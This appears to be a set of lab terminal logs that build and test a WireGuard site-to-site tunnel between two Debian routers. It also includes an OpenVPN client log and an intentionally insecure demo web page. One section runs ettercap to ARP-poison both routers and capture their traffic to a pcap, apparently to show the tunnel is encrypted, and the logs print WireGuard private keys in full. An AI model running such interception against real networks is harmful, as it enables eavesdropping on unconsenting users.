walt@moonrouter:~$ sudo apt install wireguard
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  wireguard-tools
The following NEW packages will be installed:
  wireguard wireguard-tools
0 upgraded, 2 newly installed, 0 to remove and 34 not upgraded.
Need to get 95.8 kB of archives.
After this operation, 346 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://deb.debian.org/debian bookworm/main amd64 wireguard-tools amd64 1.0.20210914-1+b1 [87.6 kB]
Get:2 http://deb.debian.org/debian bookworm/main amd64 wireguard all 1.0.20210914-1 [8,216 B]
Fetched 95.8 kB in 0s (570 kB/s)
Selecting previously unselected package wireguard-tools.
(Reading database ... 55576 files and directories currently installed.)
Preparing to unpack .../wireguard-tools_1.0.20210914-1+b1_amd64.deb ...
Unpacking wireguard-tools (1.0.20210914-1+b1) ...
Selecting previously unselected package wireguard.
Preparing to unpack .../wireguard_1.0.20210914-1_all.deb ...
Unpacking wireguard (1.0.20210914-1) ...
Setting up wireguard-tools (1.0.20210914-1+b1) ...
wg-quick.target is a disabled or a static unit, not starting it.
Setting up wireguard (1.0.20210914-1) ...
Processing triggers for man-db (2.11.2-2) ..



root@moonrouter:~# cd /etc/wireguard
root@moonrouter:/etc/wireguard# wg genkey | tee privatekey | wg pubkey > publickey
root@moonrouter:/etc/wireguard# grep '' *
privatekey:WB0ZbNTJA9qV9UPbti27lo4AP+0AAZDnhxpwMmDvSX4=
publickey:eTZptr1PlCF6wJWIc9vI2BFPbnAWS3BgXDwdyM7nwjo=




walt@remoterouter:~$ sudo apt install wireguard
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  wireguard-tools
The following NEW packages will be installed:
  wireguard wireguard-tools
0 upgraded, 2 newly installed, 0 to remove and 34 not upgraded.
Need to get 95.8 kB of archives.
After this operation, 346 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://deb.debian.org/debian bookworm/main amd64 wireguard-tools amd64 1.0.20210914-1+b1 [87.6 kB]
Get:2 http://deb.debian.org/debian bookworm/main amd64 wireguard all 1.0.20210914-1 [8,216 B]
Fetched 95.8 kB in 0s (580 kB/s)
Selecting previously unselected package wireguard-tools.
(Reading database ... 55576 files and directories currently installed.)
Preparing to unpack .../wireguard-tools_1.0.20210914-1+b1_amd64.deb ...
Unpacking wireguard-tools (1.0.20210914-1+b1) ...
Selecting previously unselected package wireguard.
Preparing to unpack .../wireguard_1.0.20210914-1_all.deb ...
Unpacking wireguard (1.0.20210914-1) ...
Setting up wireguard-tools (1.0.20210914-1+b1) ...
wg-quick.target is a disabled or a static unit, not starting it.
Setting up wireguard (1.0.20210914-1) ...
Processing triggers for man-db (2.11.2-2) ...


root@remoterouter:/etc/wireguard# grep '' *
privatekey:OF3wzsDrJRp9VbFbmZyYNk2KdkERPv5ESFjIreWamEg=
publickey:vaY4eCP+Ya0woNs4LDE6QcCwnoPB19dgLdVc2d4cEwU=









root@remoterouter:/etc/wireguard# cat wg0.conf
#remoterouter
[Interface]
Address = 10.0.0.123/24
ListenPort = 60000
PrivateKey = OF3wzsDrJRp9VbFbmZyYNk2KdkERPv5ESFjIreWamEg=

#moonrouter
[Peer]
PublicKey = eTZptr1PlCF6wJWIc9vI2BFPbnAWS3BgXDwdyM7nwjo=
AllowedIPs = 10.0.0.125/32
Endpoint = 192.168.100.251:60000
root@remoterouter:/etc/wireguard# ip -4 a s eth1
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    altname enp0s8
    inet 192.168.100.252/24 brd 192.168.100.255 scope global eth1
       valid_lft forever preferred_lft forever
root@remoterouter:/etc/wireguard# wg-quick up wg0
[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip -4 address add 10.0.0.123/24 dev wg0
[#] ip link set mtu 1420 up dev wg0
root@remoterouter:/etc/wireguard# ip -4 a s wg0
5: wg0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1420 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 10.0.0.123/24 scope global wg0
       valid_lft forever preferred_lft forever
root@remoterouter:/etc/wireguard# ping 10.0.0.123


root@moonrouter:/etc/wireguard# cat wg0.conf
#moonrouter
[Interface]
Address = 10.0.0.125/24
ListenPort = 60000
PrivateKey = WB0ZbNTJA9qV9UPbti27lo4AP+0AAZDnhxpwMmDvSX4=

#remoterouter
[Peer]
PublicKey = vaY4eCP+Ya0woNs4LDE6QcCwnoPB19dgLdVc2d4cEwU=
AllowedIPs = 10.0.0.123/32
Endpoint = 192.168.100.252:6000
root@moonrouter:/etc/wireguard# wg-quick up wg0
[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip -4 address add 10.0.0.125/24 dev wg0
[#] ip link set mtu 1420 up dev wg0
root@moonrouter:/etc/wireguard# ip -4 a s wg0
5: wg0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1420 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 10.0.0.125/24 scope global wg0
       valid_lft forever preferred_lft forever


root@moonrouter:/etc/wireguard# ping -c5 10.0.0.123
PING 10.0.0.123 (10.0.0.123) 56(84) bytes of data.
64 bytes from 10.0.0.123: icmp_seq=1 ttl=64 time=0.541 ms
64 bytes from 10.0.0.123: icmp_seq=2 ttl=64 time=0.780 ms
64 bytes from 10.0.0.123: icmp_seq=3 ttl=64 time=0.765 ms
64 bytes from 10.0.0.123: icmp_seq=4 ttl=64 time=1.06 ms
64 bytes from 10.0.0.123: icmp_seq=5 ttl=64 time=0.982 ms

--- 10.0.0.123 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4017ms
rtt min/avg/max/mdev = 0.541/0.826/1.064/0.183 ms



root@remoterouter:/etc/wireguard# systemctl enable wg-quick@wg0
Created symlink /etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service → /lib/systemd/system/wg-quick@.service.

root@moonrouter:/etc/wireguard# systemctl enable wg-quick@wg0
Created symlink /etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service → /lib/systemd/system/wg-quick@.service.






walt@remoteclient:~$ ping -c20 172.125.0.254
PING 172.125.0.254 (172.125.0.254) 56(84) bytes of data.
64 bytes from 172.125.0.254: icmp_seq=1 ttl=63 time=39.3 ms
64 bytes from 172.125.0.254: icmp_seq=2 ttl=63 time=13.3 ms
64 bytes from 172.125.0.254: icmp_seq=3 ttl=63 time=11.9 ms
64 bytes from 172.125.0.254: icmp_seq=4 ttl=63 time=10.0 ms
64 bytes from 172.125.0.254: icmp_seq=5 ttl=63 time=12.8 ms
64 bytes from 172.125.0.254: icmp_seq=6 ttl=63 time=15.3 ms
64 bytes from 172.125.0.254: icmp_seq=7 ttl=63 time=13.6 ms
64 bytes from 172.125.0.254: icmp_seq=8 ttl=63 time=12.3 ms
64 bytes from 172.125.0.254: icmp_seq=9 ttl=63 time=14.4 ms
64 bytes from 172.125.0.254: icmp_seq=10 ttl=63 time=12.9 ms
64 bytes from 172.125.0.254: icmp_seq=11 ttl=63 time=11.5 ms
64 bytes from 172.125.0.254: icmp_seq=12 ttl=63 time=14.6 ms
64 bytes from 172.125.0.254: icmp_seq=13 ttl=63 time=13.2 ms
64 bytes from 172.125.0.254: icmp_seq=14 ttl=63 time=11.5 ms
64 bytes from 172.125.0.254: icmp_seq=15 ttl=63 time=10.4 ms
64 bytes from 172.125.0.254: icmp_seq=16 ttl=63 time=15.5 ms
64 bytes from 172.125.0.254: icmp_seq=17 ttl=63 time=16.1 ms
64 bytes from 172.125.0.254: icmp_seq=18 ttl=63 time=15.5 ms
64 bytes from 172.125.0.254: icmp_seq=19 ttl=63 time=14.9 ms
64 bytes from 172.125.0.254: icmp_seq=20 ttl=63 time=17.4 ms

--- 172.125.0.254 ping statistics ---
20 packets transmitted, 20 received, 0% packet loss, time 19039ms
rtt min/avg/max/mdev = 10.015/14.818/39.345/5.935 ms

root@remoterouter:/etc/wireguard# wg-quick down wg0
[#] ip link delete dev wg0
root@remoterouter:/etc/wireguard# wg-quick up wg0
[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip -4 address add 10.0.0.123/24 dev wg0
[#] ip link set mtu 1420 up dev wg0
[#] ip -4 route add 172.125.0.0/24 dev wg0
root@remoterouter:/etc/wireguard# cat wg0.conf
#remoterouter
[Interface]
Address = 10.0.0.123/24
ListenPort = 60000
PrivateKey = OF3wzsDrJRp9VbFbmZyYNk2KdkERPv5ESFjIreWamEg=

#moonrouter
[Peer]
PublicKey = eTZptr1PlCF6wJWIc9vI2BFPbnAWS3BgXDwdyM7nwjo=
AllowedIPs = 10.0.0.125/32,172.125.0.0/24
Endpoint = 192.168.100.251:60000
root@remoterouter:/etc/wireguard#

root@moonrouter:/etc/wireguard# cat wg0.conf
#moonrouter
[Interface]
Address = 10.0.0.125/24
ListenPort = 60000
PrivateKey = WB0ZbNTJA9qV9UPbti27lo4AP+0AAZDnhxpwMmDvSX4=

#remoterouter
[Peer]
PublicKey = vaY4eCP+Ya0woNs4LDE6QcCwnoPB19dgLdVc2d4cEwU=
AllowedIPs = 10.0.0.123/32,172.123.0.0/24
Endpoint = 192.168.100.252:6000

root@moonrouter:/etc/wireguard# wg-quick up wg0
[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip -4 address add 10.0.0.125/24 dev wg0
[#] ip link set mtu 1420 up dev wg0
[#] ip -4 route add 172.123.0.0/24 dev wg0









vagrant@red:~$ sudo ettercap -T -i eth1 -M arp:remote /192.168.100.252// /192.168.100.251// -L dumpfile -w wireguard.pcap

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  eth1 -> 08:00:27:47:E5:58
          192.168.100.166/255.255.255.0


SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

3 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.100.252 08:00:27:58:75:20

 GROUP 2 : 192.168.100.251 08:00:27:25:6E:0E
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help




vagrant@homeclient:~/client$ Tue Jan  9 15:01:22 2024 VERIFY OK: depth=1, CN=companyCA
Tue Jan  9 15:01:22 2024 VERIFY KU OK
Tue Jan  9 15:01:22 2024 Validating certificate extended key usage
Tue Jan  9 15:01:22 2024 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
Tue Jan  9 15:01:22 2024 VERIFY EKU OK
Tue Jan  9 15:01:22 2024 VERIFY OK: depth=0, CN=companyserver
Tue Jan  9 15:01:22 2024 Outgoing Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue Jan  9 15:01:22 2024 Incoming Data Channel: Cipher 'AES-256-GCM' initialized with 256 bit key
Tue Jan  9 15:01:22 2024 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, 2048 bit RSA

















Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...
Unified sniffing was stopped.

vagrant@red:~$ scp openvpn.pcap benny@192.168.100.1:/c:/data/git/ca/files
openvpn.pcap




vagrant@homeclient:~/client$ ping 172.30.0.15
PING 172.30.0.15 (172.30.0.15) 56(84) bytes of data.
64 bytes from 172.30.0.15: icmp_seq=1 ttl=63 time=16.8 ms
64 bytes from 172.30.0.15: icmp_seq=2 ttl=63 time=15.1 ms
64 bytes from 172.30.0.15: icmp_seq=3 ttl=63 time=12.7 ms
64 bytes from 172.30.0.15: icmp_seq=4 ttl=63 time=11.1 ms
64 bytes from 172.30.0.15: icmp_seq=5 ttl=63 time=13.7 ms
64 bytes from 172.30.0.15: icmp_seq=6 ttl=63 time=14.9 ms
64 bytes from 172.30.0.15: icmp_seq=7 ttl=63 time=13.4 ms
^C
--- 172.30.0.15 ping statistics ---
7 packets transmitted, 7 received, 0% packet loss, time 6011ms
rtt min/avg/max/mdev = 11.139/13.975/16.814/1.699 ms
vagrant@homeclient:~/client$ curl 172.30.20.10
curl: (7) Failed to connect to 172.30.20.10 port 80: No route to host
vagrant@homeclient:~/client$ curl 172.30.20.10
curl: (7) Failed to connect to 172.30.20.10 port 80: No route to host
vagrant@homeclient:~/client$ curl 172.30.20.10
<!DOCTYPE html>
<html>
<head>
    <title>Insecure Cyb</title>
</head>
<body>

<h1>Welcome to Insecure.cyb!</h1>
<img src="https://www.eff.org/files/banner_library/http_warning.png">

<h2>We learn what it means to be not secure :) </h2>

    <p>Connected to the database</p>
    <!-- HTML Form -->
    <form method="POST" action="">
        <label for="login">Login:</label>
        <input type="text" name="login" id="login" />
        <input type="submit" value="Search" />
    </form>
</body>
</html>
vagrant@homeclient:~/client$

    